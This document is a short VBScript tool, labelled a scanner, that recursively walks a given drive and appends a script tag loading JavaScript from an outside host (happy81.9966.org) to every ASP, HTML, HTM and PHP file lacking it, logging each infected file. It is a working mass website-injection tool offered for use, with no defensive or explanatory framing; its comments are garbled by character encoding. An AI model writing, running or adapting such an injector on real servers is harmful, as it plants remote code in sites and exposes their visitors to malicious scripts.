br="************************************" & vbCrLf
br=br & "*        VBS ��������ű�          *" & vbCrLf
br=br & "*           BY BanLG               *" & vbCrLf
br=br & "************************************" & vbCrLf & vbCrLf
br=br & "cscript scan.vbe D:\" & vbCrLf
gjz="9966.org"
ma="<script src=http://happy81.9966.org/hxw/e.js></script>"
MyString="asp|html|htm|php"
MyArray = Split(MyString, "|", -1, 1)
web=WScript.Arguments(0)
if web="" then
  Wscript.echo (br)
  window.Close
end if
Wscript.echo (br) & "��ĵ�ַ��" & ma & vbCrLf & vbCrLf
Set fso = createObject("Scripting.FileSystemObject")
scan(web)
sub scan(filesder) 
set filesder=fso.getfolder(filesder)
set files=filesder.files 
for each fext in files
  Set file1 = fso.GetFile(fext)
  filesext=file1.Name
  '���ļ���ת����Сд��ĸ
  ext=fso.GetExtensionName(fext) 
    For Each index in MyArray
'�ж��ļ��ǲ���������MyString���޶����ļ�������Ǿ�д��
     yyy=""
     if ext=lcase(index) then
      if fso.GetFile(fext).size<>0 then
        set rr=fso.opentextfile(fext)
        yyy=rr.readall
        rr.Close
      end if
      if not instr(yyy,gjz)>0 then
       Set ts = fso.OpenTextFile(fext,8) '���ļ������ļ�ĩβ����д����
       ts.WriteLine(ma)
       ts.Close
       echo=""
       echo=fext & "   .............ok"
       Wscript.echo (echo)
      end if
     end if
    next
next
set subfolders=filesder.subfolders
  for each subfolder in subfolders '��������Ŀ¼,�ݹ����
     scan(subfolder)
  next 
end sub